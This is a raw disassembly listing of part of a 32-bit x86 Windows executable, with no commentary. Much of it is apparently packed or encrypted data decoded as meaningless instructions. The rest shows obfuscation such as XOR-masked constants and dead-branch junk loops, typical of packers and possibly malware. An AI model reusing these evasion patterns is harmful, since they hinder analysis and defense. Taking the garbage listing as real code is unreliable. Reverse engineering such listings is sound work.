  40e466:	mov    ebx,0xf6b83ed6
  40e46b:	loop   0x40e436
  40e46d:	or     al,BYTE PTR [edx-0x4f]
  40e470:	icebp  
  40e471:	xchg   BYTE PTR [eax-0x4ce10b94],bh
  40e477:	cwde   
  40e478:	cmc    
  40e479:	xor    BYTE PTR ds:0x832f720,0xd7
  40e480:	add    BYTE PTR [ebx],0x92
  40e483:	in     al,dx
  40e484:	push   ds
  40e485:	sbb    eax,0xd561a72
  40e48a:	jb     0x40e4bb
  40e48c:	ins    DWORD PTR es:[edi],dx
  40e48d:	xchg   edi,eax
  40e48f:	mov    edx,0x8c7341be
  40e494:	cmp    eax,0xc2eafee4
  40e499:	add    cl,dh
  40e49b:	inc    edx
  40e49c:	inc    ecx
  40e49d:	adc    edx,DWORD PTR [edx-0x74ae370c]
  40e4a3:	jnp    0x40e4f7
  40e4a5:	add    edx,ebp
  40e4a7:	pop    eax
  40e4a8:	jbe    0x40e4d9
  40e4aa:	mul    cl
  40e4ac:	dec    ecx
  40e4ad:	in     eax,0xf2
  40e4af:	mov    esi,0x33ed2412
  40e4b4:	inc    eax
  40e4b6:	xchg   edx,eax
  40e4b7:	cwde   
  40e4b8:	adc    bh,ah
  40e4ba:	sbb    BYTE PTR [eax-0x1e],dh
  40e4bd:	dec    esp
  40e4be:	and    edi,edx
  40e4c0:	push   esp
  40e4c1:	rcr    DWORD PTR [esi],1
  40e4c3:	or     eax,0xb6ad7293
  40e4c8:	out    dx,al
  40e4c9:	jmp    0x40e53b
  40e4cb:	jne    0x40e4cd
  40e4cd:	jp     0x40e487
  40e4cf:	sub    BYTE PTR [eax-0x5d4bb2c6],al
  40e4d5:	push   eax
  40e4d6:	pushf  
  40e4d7:	mov    ebp,0x7dc3bcb
  40e4dc:	imul   esp,DWORD PTR [edi+0x591e3e18],0xffffffda
  40e4e3:	es addr16 icebp 
  40e4e6:	in     al,0xec
  40e4e8:	push   esi
  40e4e9:	mov    ecx,0xec037d02
  40e4ee:	(bad)  
  40e4ef:	call   0x901f:0x83dea24e
  40e4f6:	push   edx
  40e4f7:	push   eax
  40e4f8:	ret    
  40e4f9:	ret    
  40e4fa:	repnz mov ebx,0xd013515b
  40e500:	fadd   DWORD PTR [edx-0xfb62f06]
  40e506:	sar    dh,cl
  40e508:	add    ebp,edx
  40e50a:	test   bh,al
  40e50c:	loope  0x40e528
  40e50e:	sbb    BYTE PTR [edi+0x546d98b9],bh
  40e514:	jl     0x40e4b0
  40e516:	das    
  40e517:	dec    esp
  40e518:	(bad)  
  40e51a:	mov    eax,ebx
  40e51c:	and    esi,DWORD PTR [ecx+0x21]
  40e51f:	fs cdq 
  40e521:	or     BYTE PTR [ebp+0x3ab7a521],ch
  40e527:	jmp    0x20e7:0xfd0b3d7b
  40e52e:	inc    edi
  40e52f:	iret   
  40e530:	ret    
  40e531:	enter  0x8243,0xf0
  40e535:	dec    ebp
  40e536:	lods   al,BYTE PTR ds:[esi]
  40e537:	std    
  40e538:	xchg   ebx,eax
  40e539:	mov    eax,ds:0x35ba18f5
  40e53e:	mov    esp,0x9cf55782
  40e543:	dec    eax
  40e544:	dec    eax
  40e545:	xor    eax,0xeddac835
  40e54a:	cli    
  40e54b:	dec    eax
  40e54c:	loopne 0x40e594
  40e54e:	dec    edi
  40e54f:	push   ecx
  40e550:	shr    esi,0x6c
  40e553:	call   DWORD PTR [ecx+0x11]
  40e556:	mov    ?,esi
  40e558:	cmp    al,0xe9
  40e55a:	xchg   edx,eax
  40e55b:	mov    al,ds:0x8c48a481
  40e560:	fld    DWORD PTR [ebp-0x19]
  40e563:	and    DWORD PTR [esi],ecx
  40e565:	adc    esp,DWORD PTR [esi+0x8]
  40e568:	bound  ebx,QWORD PTR [edx-0x707bb851]
  40e56e:	pusha  
  40e56f:	xor    eax,0x693c8bc9
  40e574:	dec    ecx
  40e575:	sbb    bl,ch
  40e577:	test   BYTE PTR [ecx-0x5f0d6fc6],ah
  40e57d:	push   0xffffffbb
  40e57f:	es or  ecx,eax
  40e582:	dec    edi
  40e583:	add    DWORD PTR [ecx],0xffffffef
  40e586:	les    eax,FWORD PTR [eax-0x35]
  40e589:	fst    QWORD PTR [ebx+0x26]
  40e58c:	pop    ss
  40e58d:	imul   ebx,DWORD PTR [ecx+0x5b1c7259],0x44
  40e594:	(bad)  
  40e595:	mov    al,0x1b
  40e597:	nop    esi
  40e59a:	lods   al,BYTE PTR ds:[esi]
  40e59b:	push   cs
  40e59c:	and    eax,0x15ff40ab
  40e5a1:	mov    edi,0x4b005690
  40e5a6:	fcom   st(7)
  40e5a8:	sub    ebx,DWORD PTR [edi-0x186c94c8]
  40e5ae:	call   0x7ec36e77
  40e5b3:	cli    
  40e5b4:	cmp    ebp,DWORD PTR [ebx+0x6e7a4f7]
  40e5ba:	push   ebx
  40e5bb:	cs mov cl,0xc9
  40e5be:	mov    ebx,DWORD PTR [ebx-0x25955695]
  40e5c4:	push   esp
  40e5c5:	xchg   ebp,eax
  40e5c6:	das    
  40e5c7:	mov    ah,BYTE PTR [edx+0x1abf268a]
  40e5cd:	and    al,0xab
  40e5cf:	hlt    
  40e5d0:	push   esp
  40e5d1:	xchg   ecx,eax
  40e5d2:	out    dx,al
  40e5d3:	mov    ebp,DWORD PTR [eax+0x70ae5a63]
  40e5d9:	sbb    BYTE PTR [edi+0x75c17039],bl
  40e5df:	cs ins BYTE PTR es:[edi],dx
  40e5e1:	pop    ds
  40e5e2:	(bad)  
  40e5e3:	icebp  
  40e5e4:	scas   eax,DWORD PTR es:[edi]
  40e5e5:	aam    0xa
  40e5e7:	xchg   edx,ecx
  40e5e9:	add    BYTE PTR [eax-0x49],cl
  40e5ec:	dec    esp
  40e5ed:	mov    al,0xa6
  40e5ef:	xchg   ebp,eax
  40e5f0:	add    eax,0x190f5c70
  40e5f5:	push   ds
  40e5f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e5f7:	mov    eax,0xeee438fd
  40e5fc:	sbb    ch,0xaf
  40e5ff:	xor    al,0x31
  40e601:	xchg   edi,eax
  40e602:	pop    ss
  40e603:	adc    dh,al
  40e605:	fistp  WORD PTR [ecx]
  40e607:	(bad)
  40e60c:	cmp    al,0xa5
  40e60e:	fs mov ecx,0xe3d9335
  40e614:	add    BYTE PTR [eax],al
  40e616:	ret    
  40e617:	jmp    0x1f8407fd
  40e61c:	retf   0x7b6
  40e61f:	es sbb ecx,ebp
  40e622:	sti    
  40e623:	sub    BYTE PTR [edx],dh
  40e625:	test   eax,0xe5034187
  40e62a:	pop    ebx
  40e62b:	add    eax,0x288627d4
  40e630:	test   al,0xf9
  40e632:	push   eax
  40e633:	dec    edi
  40e634:	dec    edx
  40e635:	outs   dx,BYTE PTR ds:[esi]
  40e636:	sub    eax,DWORD PTR [edi+0x37]
  40e639:	leave  
  40e63a:	mov    al,0xf6
  40e63c:	mov    al,ds:0x8d637050
  40e641:	mov    cl,0xc6
  40e643:	cwde   
  40e644:	adc    ch,BYTE PTR [ebp+0x45]
  40e647:	mov    ah,BYTE PTR [eax+0x2d0d6d57]
  40e64d:	cmc    
  40e64e:	fsubr  QWORD PTR [esi+0x2f]
  40e651:	sbb    eax,0x9d6ffa04
  40e656:	into   
  40e657:	stos   DWORD PTR es:[edi],eax
  40e658:	sbb    eax,0x6c47192d
  40e65d:	dec    ebx
  40e65e:	jp     0x40e63d
  40e660:	ins    BYTE PTR es:[edi],dx
  40e661:	mov    ebp,0xfd6eaee8
  40e666:	(bad)  
  40e667:	(bad)  
  40e668:	mov    al,ds:0x88501f61
  40e66d:	ret    0xa53b
  40e670:	mov    ds:0xda4c457f,al
  40e675:	lea    ecx,[edx+0x36]
  40e678:	jge    0x40e6f5
  40e67a:	lock mov al,ds:0xad718b97
  40e680:	cli    
  40e681:	stos   DWORD PTR es:[edi],eax
  40e682:	popf   
  40e683:	or     DWORD PTR [esp+ebx*2-0x66],esp
  40e687:	jmp    0x11023ebd
  40e68c:	jae    0x40e653
  40e68e:	mov    esi,0x51daff44
  40e693:	jbe    0x40e642
  40e695:	add    al,0x48
  40e697:	stos   BYTE PTR es:[edi],al
  40e698:	xchg   esp,eax
  40e699:	push   esi
  40e69a:	out    dx,eax
  40e69b:	js     0x40e670
  40e69d:	inc    ecx
  40e69e:	jnp    0x40e633
  40e6a0:	inc    ebp
  40e6a1:	and    eax,0x199aaf08
  40e6a6:	or     esp,ecx
  40e6a8:	mov    WORD PTR [esi+0x18816262],es
  40e6ae:	jle    0x40e6d3
  40e6b0:	mov    al,0x5
  40e6b2:	repz lds ebp,FWORD PTR [ecx+0x73]
  40e6b6:	enter  0xc01c,0x69
  40e6ba:	ficom  WORD PTR [edx-0x5ae3301f]
  40e6c0:	mov    edi,0x1065d611
  40e6c5:	jp     0x40e6ad
  40e6c7:	pop    ecx
  40e6c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6c9:	fadd   QWORD PTR [ebp+ebp*8-0x67659f4d]
  40e6d0:	ret    0xa567
  40e6d3:	sbb    al,dh
  40e6d5:	jns    0x40e6dc
  40e6d7:	out    0x67,eax
  40e6d9:	add    DWORD PTR [ebx],ecx
  40e6db:	popa   
  40e6dc:	shl    DWORD PTR [ebp-0x38978d36],1
  40e6e2:	lea    esp,es:[ebx-0xec45b]
  40e6e9:	out    dx,eax
  40e6ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e6eb:	mov    ecx,0x603f5175
  40e6f0:	sbb    ebp,DWORD PTR [ebp+0x5b]
  40e6f3:	dec    esi
  40e6f4:	add    BYTE PTR [esi],ch
  40e6f6:	cmp    DWORD PTR [ebp+eiz*8-0x27],ecx
  40e6fa:	adc    ecx,DWORD PTR [eax]
  40e6fc:	or     BYTE PTR [ecx-0x4a7077be],bl
  40e702:	cwde   
  40e703:	je     0x40e6ec
  40e705:	and    DWORD PTR [ecx],0x4d1428c5
  40e70b:	cmp    DWORD PTR [ecx+eiz*1-0x1578ddf3],ebx
  40e712:	bound  ebx,QWORD PTR [ecx]
  40e714:	sbb    BYTE PTR [edi-0xffb4d3c],0x47
  40e71b:	pop    edx
  40e71c:	mov    ecx,0x44cd9bd4
  40e721:	lock mov cl,0x9b
  40e724:	xchg   edx,eax
  40e725:	jbe    0x40e6b4
  40e727:	mov    eax,ds:0x46e11b10
  40e72c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e72d:	push   cs
  40e72e:	mov    bl,0xf5
  40e730:	das    
  40e731:	out    dx,eax
  40e732:	cmp    eax,0x9af1b6f9
  40e737:	nop
  40e738:	in     eax,dx
  40e739:	add    BYTE PTR [ecx-0x60],0x80
  40e73d:	sub    dh,BYTE PTR [ebx+0x1823f86e]
  40e743:	aad    0xad
  40e745:	sbb    dl,BYTE PTR [esi]
  40e747:	fnstenv [edi+0x62]
  40e74a:	and    eax,0x14837f80
  40e74f:	js     0x40e737
  40e751:	div    DWORD PTR [eax+0x4c]
  40e754:	mov    edx,0x2f3a659f
  40e759:	or     eax,0x6910fbbc
  40e75e:	sbb    al,0xe4
  40e760:	dec    ebp
  40e761:	ja     0x40e757
  40e763:	ds int3 
  40e765:	pop    ebx
  40e766:	sahf   
  40e767:	push   es
  40e768:	or     eax,0x559da272
  40e76d:	lea    edx,[edx+edi*2-0x6c38256]
  40e774:	outs   dx,BYTE PTR ds:[esi]
  40e775:	ins    DWORD PTR es:[edi],dx
  40e776:	mov    ds:0x948896cf,eax
  40e77b:	in     al,dx
  40e77c:	lea    esp,[ebp+0x74]
  40e77f:	pop    ebx
  40e780:	int3   
  40e781:	lahf   
  40e782:	mov    ch,0xc2
  40e784:	xor    eax,0x6bf06eef
  40e789:	nop
  40e78a:	sub    eax,0x5e32f919
  40e78f:	dec    ecx
  40e790:	xchg   ebx,eax
  40e791:	jne    0x40e7c4
  40e793:	xchg   ecx,eax
  40e794:	xor    eax,0x32190edc
  40e799:	icebp  
  40e79a:	hlt    
  40e79b:	add    bl,BYTE PTR [eax+0x2b]
  40e79e:	pop    esp
  40e79f:	mov    ebx,ecx
  40e7a1:	addr16 jno 0x40e791
  40e7a4:	dec    eax
  40e7a5:	or     al,0x10
  40e7a7:	mov    ds:0x9f1049b8,eax
  40e7ac:	jnp    0x40e7b8
  40e7ae:	dec    eax
  40e7af:	test   BYTE PTR [edi+0x3255b1e7],0x8b
  40e7b6:	jmp    DWORD PTR [ebx+0x76]
  40e7b9:	lock es scas eax,DWORD PTR es:[edi]
  40e7bc:	sar    DWORD PTR [edi-0x3150c66e],cl
  40e7c2:	adc    bl,BYTE PTR [esi-0x6c0ed4db]
  40e7c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e7c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e7ca:	aaa    
  40e7cb:	and    BYTE PTR [esi+eax*4],ah
  40e7ce:	scas   eax,DWORD PTR es:[edi]
  40e7cf:	sbb    edx,DWORD PTR [ebx-0x64]
  40e7d2:	sub    DWORD PTR [esi-0xee02dc6],eax
  40e7d8:	(bad)  
  40e7d9:	cli    
  40e7da:	sub    DWORD PTR [ebx+0x7206286],0xffffff85
  40e7e1:	mov    eax,0xb39cc390
  40e7e6:	fldenv [ecx]
  40e7e8:	sbb    edx,DWORD PTR [ecx+esi*4-0x4f3ec57e]
  40e7ef:	rol    DWORD PTR [edi-0x4b6d9b2a],1
  40e7f5:	aam    0x27
  40e7f7:	test   eax,0xd43bd9ab
  40e7fc:	xor    BYTE PTR [ecx],ah
  40e7fe:	enter  0x4fe,0x10
  40e802:	pop    ss
  40e803:	fcom   DWORD PTR [eax]
  40e805:	ret    
  40e806:	inc    edi
  40e807:	adc    BYTE PTR ds:0x775a0784,al
  40e80d:	sti    
  40e80e:	sbb    DWORD PTR [ebp+0x4c711533],eax
  40e814:	mov    bl,0xd2
  40e816:	mov    ebx,0x524a2467
  40e81b:	outs   dx,BYTE PTR ds:[esi]
  40e81c:	jnp    0x40e82f
  40e81e:	outs   dx,BYTE PTR ds:[esi]
  40e81f:	loopne 0x40e7dd
  40e821:	mov    ch,0x10
  40e823:	xchg   esi,eax
  40e824:	xlat   BYTE PTR ds:[ebx]
  40e825:	sbb    al,0x4
  40e827:	fimul  DWORD PTR [edi+0x33]
  40e82a:	imul   edi,DWORD PTR ds:0x1a51b822,0xd625bb66
  40e834:	mov    BYTE PTR [edi-0x55],ah
  40e837:	fcom   QWORD PTR [eax]
  40e839:	clc    
  40e83a:	daa    
  40e83b:	mov    eax,0x6b83d7ab
  40e840:	(bad)  
  40e841:	xchg   esi,eax
  40e842:	xchg   edi,eax
  40e843:	in     eax,0x67
  40e845:	mov    eax,0x2515ae58
  40e84a:	sub    BYTE PTR [ecx],bl
  40e84c:	call   0xcbbe:0xf74a606f
  40e853:	mov    DWORD PTR [esi+ebp*1],0x48d95c9c
  40e85a:	xor    edi,DWORD PTR ss:0x63eb91d5
  40e861:	xchg   ecx,eax
  40e862:	jge    0x40e831
  40e864:	sbb    al,0xfb
  40e866:	clc    
  40e867:	cdq    
  40e868:	dec    esp
  40e869:	push   0x97fcb6d8
  40e86e:	test   eax,0x3c17e63d
  40e873:	add    ah,BYTE PTR [ebx+0x60]
  40e876:	call   eax
  40e878:	or     cl,bh
  40e87a:	dec    esp
  40e87b:	jg     0x40e891
  40e87d:	nop
  40e87e:	outs   dx,BYTE PTR ds:[esi]
  40e87f:	mov    bl,0xae
  40e881:	xor    eax,0xde3ffde5
  40e886:	and    BYTE PTR [ebx-0x3e],ah
  40e889:	sbb    al,0x28
  40e88c:	int3   
  40e88d:	bnd ret 0x4f3a
  40e891:	es adc eax,0xfb90d8c4
  40e897:	xor    edi,eax
  40e899:	pusha  
  40e89a:	shl    DWORD PTR [esi+0x6d],cl
  40e89d:	test   BYTE PTR [ebx],dh
  40e89f:	mov    ebx,0xf130a673
  40e8a4:	pusha  
  40e8a5:	inc    esp
  40e8a6:	imul   eax,DWORD PTR [edx+0x37],0x98cf4b8c
  40e8ad:	mov    ebp,0x4dc258ff
  40e8b2:	mov    esp,0x22719933
  40e8b7:	out    dx,al
  40e8b8:	xor    al,BYTE PTR [ecx]
  40e8ba:	add    cl,al
  40e8bc:	shr    BYTE PTR [ecx-0x56],1
  40e8bf:	adc    BYTE PTR [edi-0x5940e9c],cl
  40e8c5:	(bad)  
  40e8c6:	push   ebx
  40e8c7:	inc    ebp
  40e8c8:	pop    es
  40e8c9:	xchg   DWORD PTR ds:[ebp-0x7dc106da],edi
  40e8d0:	dec    DWORD PTR fs:[ebx*8+0x75b93c24]
  40e8d8:	xor    esp,DWORD PTR [edx]
  40e8da:	mov    ebx,0xdc8dd6a2
  40e8df:	neg    BYTE PTR [ebx+edi*1]
  40e8e2:	or     ah,0x96
  40e8e5:	sbb    BYTE PTR [edx+0x20],bh
  40e8e8:	xchg   ebp,eax
  40e8e9:	cwde   
  40e8ea:	mov    ecx,0x37acaaed
  40e8ef:	pop    edi
  40e8f0:	jmp    0xdef4eab6
  40e8f5:	and    DWORD PTR [eax+0x79e886af],0xffffff92
  40e8fc:	stos   DWORD PTR es:[edi],eax
  40e8fd:	xchg   edx,eax
  40e8fe:	mov    gs,WORD PTR [ecx-0x2badf07a]
  40e904:	jp     0x40e8e5
  40e906:	push   ds
  40e907:	test   DWORD PTR [esi+0x2c51fcdd],esp
  40e90d:	test   eax,0x73e657be
  40e912:	sbb    DWORD PTR [esi-0x7c],edi
  40e915:	dec    esp
  40e916:	jmp    0x40e98e
  40e918:	stos   DWORD PTR es:[edi],eax
  40e919:	in     eax,dx
  40e91a:	cs jge 0x40e8d3
  40e91d:	mov    dl,0x73
  40e91f:	cwde   
  40e920:	push   edi
  40e921:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e922:	xchg   esi,eax
  40e923:	pop    esp
  40e924:	mov    ds:0xec686c61,eax
  40e929:	inc    ecx
  40e92a:	push   eax
  40e92b:	adc    esp,DWORD PTR [eax-0x22794c]
  40e931:	mov    ds:0xa714181d,al
  40e936:	inc    eax
  40e937:	(bad)  
  40e938:	fcom   DWORD PTR [esi]
  40e93a:	jecxz  0x40e8c5
  40e93c:	pop    esp
  40e93d:	mov    esi,DWORD PTR [edx+0x4bc9d391]
  40e943:	mov    esi,0xabcdd1ae
  40e948:	jecxz  0x40e9af
  40e94a:	fs xchg ecx,eax
  40e94c:	xor    esi,eax
  40e94e:	jns    0x40e93a
  40e950:	jb     0x40e943
  40e952:	mov    ds:0xcf1470fb,al
  40e957:	jmp    0xeef5:0xe2ea47a9
  40e95e:	das    
  40e95f:	sahf   
  40e960:	mov    edx,0x30ca6a7a
  40e965:	pop    ss
  40e966:	arpl   WORD PTR [ecx-0x39],bp
  40e969:	gs xchg edx,eax
  40e96b:	add    ch,bl
  40e96d:	test   cl,dh
  40e96f:	xor    dl,BYTE PTR ds:0x98a5e525
  40e975:	sti    
  40e976:	and    eax,0xc80b166c
  40e97b:	add    cl,BYTE PTR [ecx]
  40e97d:	data16 (bad) 
  40e97f:	xor    eax,0xe8b39f1e
  40e984:	call   0x7c3d:0xaa6adca0
  40e98b:	cld    
  40e98c:	lea    ebp,[ebp+0x66231e5f]
  40e992:	loop   0x40e9f7
  40e994:	stos   BYTE PTR es:[edi],al
  40e995:	add    BYTE PTR [edi+0x3c788b72],0x8d
  40e99c:	je     0x40e995
  40e99e:	js     0x40e92b
  40e9a0:	xor    al,0x6
  40e9a2:	mov    DWORD PTR [ebp-0x8],esi
  40e9a5:	mov    esi,DWORD PTR [ebp+0x8]
  40e9a8:	xor    esi,ecx
  40e9aa:	add    esi,edx
  40e9ac:	mov    DWORD PTR [ebp-0x14],esi
  40e9af:	mov    esi,DWORD PTR [ebp+0x8]
  40e9b2:	mov    edi,DWORD PTR [ebp-0x8]
  40e9b5:	xor    esi,ecx
  40e9b7:	add    esi,edx
  40e9b9:	pop    ebx
  40e9ba:	cmp    edi,esi
  40e9bc:	jne    0x40e9da
  40e9c2:	mov    eax,DWORD PTR [ebp+0xc]
  40e9c5:	xor    eax,ecx
  40e9c7:	mov    ecx,DWORD PTR [ebp-0x8]
  40e9ca:	add    eax,edx
  40e9cc:	imul   eax,ecx
  40e9cf:	mov    DWORD PTR [ebp-0x8],eax
  40e9d2:	push   DWORD PTR [ebp+0x18]
  40e9d5:	jmp    0x40ea2e
  40e9da:	mov    ecx,DWORD PTR [ebp-0x8]
  40e9dd:	add    ecx,eax
  40e9df:	mov    DWORD PTR [ebp-0x14],ecx
  40e9e2:	mov    ecx,DWORD PTR [ebp-0x14]
  40e9e5:	mov    ecx,DWORD PTR [ecx+0xc]
  40e9e8:	movsx  cx,BYTE PTR [ecx+eax*1]
  40e9ed:	mov    edx,0x3b51
  40e9f2:	sub    cx,dx
  40e9f5:	mov    edx,0x8a8d
  40e9fa:	xor    cx,dx
  40e9fd:	mov    edx,0x4e77
  40ea02:	cmp    cx,dx
  40ea05:	jne    0x40e9d2
  40ea0b:	mov    ecx,DWORD PTR ds:0x42e2b7
  40ea11:	mov    ecx,DWORD PTR [ecx+0x198]
  40ea17:	mov    DWORD PTR [ecx],eax
  40ea19:	jmp    0x40ea3f
  40ea1e:	mov    ecx,DWORD PTR [ebp+0x18]
  40ea21:	cmp    ecx,0xf89c8584
  40ea27:	jne    0x40ea3f
  40ea2d:	push   eax
  40ea2e:	push   DWORD PTR [ebp+0x14]
  40ea31:	push   DWORD PTR [ebp+0x10]
  40ea34:	push   DWORD PTR [ebp+0xc]
  40ea37:	push   DWORD PTR [ebp+0x8]
  40ea3a:	call   0x405799
  40ea3f:	pop    edi
  40ea40:	pop    esi
  40ea41:	leave  
  40ea42:	ret    0x14
  40ea45:	push   ebp
  40ea46:	mov    ebp,esp
  40ea48:	sub    esp,0xc
  40ea4b:	and    DWORD PTR ds:0x42d00c,0x0
  40ea55:	jmp    0x40ea67
  40ea5a:	mov    edx,DWORD PTR ds:0x42d00c
  40ea60:	inc    edx
  40ea61:	mov    DWORD PTR ds:0x42d00c,edx
  40ea67:	cmp    DWORD PTR ds:0x42d00c,0x16
  40ea6e:	jae    0x40eb33
  40ea74:	cmp    DWORD PTR ds:0x42d00c,0xd
  40ea7b:	jne    0x40eac1
  40ea81:	push   0x42e075
  40ea86:	push   0x6212
  40ea8b:	push   DWORD PTR [ebp-0x28]
  40ea8e:	push   0x739a
  40ea93:	push   DWORD PTR [ebp-0x20]
  40ea96:	push   0x3288
  40ea9b:	push   DWORD PTR [ebp-0x28]
  40ea9e:	push   DWORD PTR [ebp-0x1c]
  40eaa1:	push   0x2781
  40eaa6:	push   0x445b
  40eaab:	push   0x2755
  40eab0:	push   DWORD PTR [ebp-0x24]
  40eab3:	push   DWORD PTR [ebp-0x1c]
  40eab6:	push   0x361a
  40eabb:	call   DWORD PTR ds:0x42e8bb
  40eac1:	cmp    DWORD PTR ds:0x42d00c,0xc
  40eac8:	jne    0x40eadb
  40eace:	mov    edx,DWORD PTR ds:0x42d00c
  40ead4:	inc    edx
  40ead5:	mov    DWORD PTR ds:0x42d00c,edx
  40eadb:	jmp    0x40ea5a
  40eae0:	and    DWORD PTR ds:0x42c008,0x0
  40eaea:	jmp    0x40eafe
  40eaef:	xor    edx,edx
  40eaf1:	or     edx,DWORD PTR ds:0x42c008
  40eaf7:	inc    edx
  40eaf8:	mov    DWORD PTR ds:0x42c008,edx
  40eafe:	cmp    DWORD PTR ds:0x42c008,0x14
  40eb05:	jae    0x40eb33
  40eb0b:	cmp    DWORD PTR ds:0x42c008,0x18
  40eb12:	jne    0x40eb2e
  40eb18:	push   DWORD PTR [ebp-0x24]
  40eb1b:	push   DWORD PTR [ebp-0x18]
  40eb1e:	push   0x8994
  40eb23:	push   0x6271
  40eb28:	call   DWORD PTR ds:0x42e8e7
  40eb2e:	jmp    0x40eaef
  40eb33:	push   esi
  40eb34:	mov    esi,0xf89c8585
  40eb39:	xor    DWORD PTR ds:0x429000,ebx
  40eb3f:	mov    DWORD PTR [ebp-0x8],esi
  40eb42:	mov    DWORD PTR [ebp-0x4],0xf89c8584
  40eb49:	mov    edx,DWORD PTR ds:0x41cd75
  40eb4f:	mov    ecx,DWORD PTR ds:0x41ce0c
  40eb55:	sub    ecx,edx
  40eb57:	add    edx,DWORD PTR [edx+ecx*1]
  40eb5a:	push   edi
  40eb5b:	mov    eax,eax
  40eb5d:	mov    eax,DWORD PTR [ebp-0x4]
  40eb60:	mov    edi,DWORD PTR [ebp-0x8]
  40eb63:	mov    ecx,0x751089b
  40eb68:	xor    eax,ecx
  40eb6a:	xor    edi,ecx
  40eb6c:	mov    edx,0x3272e2
  40eb71:	add    edi,edx
  40eb73:	add    eax,edx
  40eb75:	imul   eax,edi
  40eb78:	mov    edi,DWORD PTR [ebp+0xc]
  40eb7b:	cmp    edi,eax
  40eb7d:	je     0x40ebd2
  40eb83:	mov    DWORD PTR [ebp-0xc],esi
  40eb86:	mov    eax,DWORD PTR [ebp-0xc]
  40eb89:	mov    esi,DWORD PTR [ebp+0xc]
  40eb8c:	xor    eax,ecx
  40eb8e:	lea    eax,[eax*8+0x1939788]
  40eb95:	mov    eax,DWORD PTR [esi+eax*1]
  40eb98:	mov    DWORD PTR [ebp+0xc],eax
  40eb9b:	mov    eax,DWORD PTR [ebp-0x4]
  40eb9e:	mov    esi,DWORD PTR [ebp-0x8]
  40eba1:	xor    eax,ecx
  40eba3:	xor    esi,ecx
  40eba5:	add    esi,edx
  40eba7:	add    eax,edx
  40eba9:	imul   eax,esi
  40ebac:	mov    esi,DWORD PTR [ebp+0xc]
  40ebaf:	cmp    esi,eax
  40ebb1:	je     0x40ebd2
  40ebb7:	mov    eax,DWORD PTR [ebp-0x4]
  40ebba:	xor    eax,ecx
  40ebbc:	mov    ecx,DWORD PTR [ebp+0xc]
  40ebbf:	add    eax,edx
  40ebc1:	imul   eax,ecx
  40ebc4:	add    eax,DWORD PTR [ebp+0x8]
  40ebc7:	mov    DWORD PTR [ebp+0xc],eax
  40ebca:	mov    eax,DWORD PTR [ebp+0xc]
  40ebcd:	jmp    0x40ebe3
  40ebd2:	mov    eax,DWORD PTR [ebp-0x4]
  40ebd5:	mov    esi,DWORD PTR [ebp-0x8]
  40ebd8:	xor    esi,ecx
  40ebda:	xor    eax,ecx
  40ebdc:	add    esi,edx
  40ebde:	add    eax,edx
  40ebe0:	imul   eax,esi
  40ebe3:	pop    edi
  40ebe4:	pop    esi
  40ebe5:	leave  
  40ebe6:	ret    0x8
  40ebe9:	push   ebp
  40ebea:	mov    ebp,esp
  40ebec:	push   ecx
  40ebed:	and    DWORD PTR ds:0x42a00c,0x0
  40ebf7:	xor    ecx,ecx
  40ebf9:	or     ecx,DWORD PTR ds:0x42a00c
  40ebff:	inc    ecx
  40ec00:	mov    DWORD PTR ds:0x42a00c,ecx
  40ec06:	cmp    DWORD PTR ds:0x42a00c,0x21
  40ec0d:	jne    0x40ec29
  40ec13:	push   0x29ed
  40ec18:	push   DWORD PTR [ebp-0x24]
  40ec1b:	push   0x42e0c2
  40ec20:	push   DWORD PTR [ebp-0x28]
  40ec23:	call   DWORD PTR ds:0x42e8eb
  40ec29:	cmp    DWORD PTR ds:0x42a00c,0x1f
  40ec30:	jb     0x40ebf7
  40ec36:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  40ec3d:	mov    eax,DWORD PTR [ebp-0x4]
  40ec40:	mov    edx,DWORD PTR [ebp+0x10]
  40ec43:	and    DWORD PTR ds:0x42b004,0x0
  40ec4d:	jmp    0x40ec5f
  40ec52:	mov    ecx,DWORD PTR ds:0x42b004
  40ec58:	inc    ecx
  40ec59:	mov    DWORD PTR ds:0x42b004,ecx
  40ec5f:	cmp    DWORD PTR ds:0x42b004,0x1d
  40ec66:	jae    0x40ec84
  40ec6c:	cmp    DWORD PTR ds:0x42b004,0x29
  40ec73:	jne    0x40ec7f
  40ec79:	call   DWORD PTR ds:0x42e8ef
  40ec7f:	jmp    0x40ec52
  40ec84:	mov    ecx,0x751089b
  40ec89:	xor    eax,ecx
  40ec8b:	add    eax,0x3272e2
  40ec90:	mov    DWORD PTR [edx],eax
  40ec92:	mov    eax,DWORD PTR [ebp+0xc]
  40ec95:	xor    eax,ecx
  40ec97:	push   esi
  40ec98:	mov    esi,DWORD PTR [ebp+0x10]
  40ec9b:	mov    edx,0x3272e2
  40eca0:	add    eax,edx
  40eca2:	mov    DWORD PTR [esi+0x4],eax
  40eca5:	mov    eax,DWORD PTR [ebp+0x14]
  40eca8:	mov    esi,DWORD PTR [ebp+0x10]
  40ecab:	mov    DWORD PTR [esi+0x8],eax
  40ecae:	mov    eax,DWORD PTR [ebp+0x18]
  40ecb1:	mov    esi,DWORD PTR [ebp+0x10]
  40ecb4:	mov    DWORD PTR [esi+0xc],eax
  40ecb7:	mov    eax,DWORD PTR [ebp+0x1c]
  40ecba:	mov    esi,DWORD PTR [ebp+0x10]
  40ecbd:	mov    DWORD PTR [esi+0x10],eax
  40ecc0:	mov    eax,DWORD PTR [ebp+0x8]
  40ecc3:	xor    eax,ecx
  40ecc5:	add    eax,edx
  40ecc7:	pop    esi
  40ecc8:	leave  
  40ecc9:	ret    0x18
  40eccc:	push   ebp
  40eccd:	mov    ebp,esp
  40eccf:	sub    esp,0x9c
  40ecd5:	adc    DWORD PTR ds:0x42c004,ecx
  40ecdb:	jmp    0x411024
  40ece0:	xor    edx,edx
  40ece2:	jg     0x40ecc5
  40ece4:	(bad)  
  40ece6:	mov    bl,0xb2
  40ece8:	pop    ebx
  40ece9:	ja     0x40ecd9
  40eceb:	inc    eax
  40ecec:	cmp    al,0xfe
  40ecee:	cwde   
  40ecef:	fdivr  DWORD PTR [esp+ecx*8+0x7c]
  40ecf3:	jl     0x40ed35
